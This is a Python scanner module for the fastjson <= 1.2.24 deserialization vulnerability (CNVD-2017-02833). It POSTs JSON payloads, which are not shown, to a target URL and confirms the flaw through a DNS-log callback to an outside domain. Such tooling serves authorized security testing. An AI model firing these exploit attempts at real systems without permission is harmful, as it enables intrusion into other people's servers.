#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.logger import logger
from thirdparty import requests
from time import sleep

def cnvd_2017_02833_scan(self, url):
    ''' fastjson <= 1.2.24 反序列化漏洞'''
    url = url.rstrip('/')
    sessid = '7d5ff4518944d45f35d9850f3d9be254'

    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'unSerialize'
    vul_info['vul_id'] = 'CNVD-2017-02833'
    vul_info['vul_method'] = 'POST'
    vul_info['headers'] = {
        'Content-Type': 'application/json'
    }

    headers = self.headers.copy()                               # * 复制一份headers, 防止污染全局headers
    headers.update(vul_info['headers'])                         # * 合并Headers

    for payload in self.cnvd_2017_02833_payloads:                # * Payload
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        path = payload['path']                                  # * Path
        data = payload['data'].replace('dnsdomain', dns_domain) # * Data
        target = url + path                                     # * Target

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=headers,                                # * 使用该漏洞的特殊headers为headers, 使用正常的headers为self.headers
                data=data, 
                proxies=self.proxies, 
                verify=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG


            # todo 判断
            sleep(3)                                                # * dns查询可能较慢, 等一会
            if (md in dns.result(md, sessid)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Payload': res
                }
                return results

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
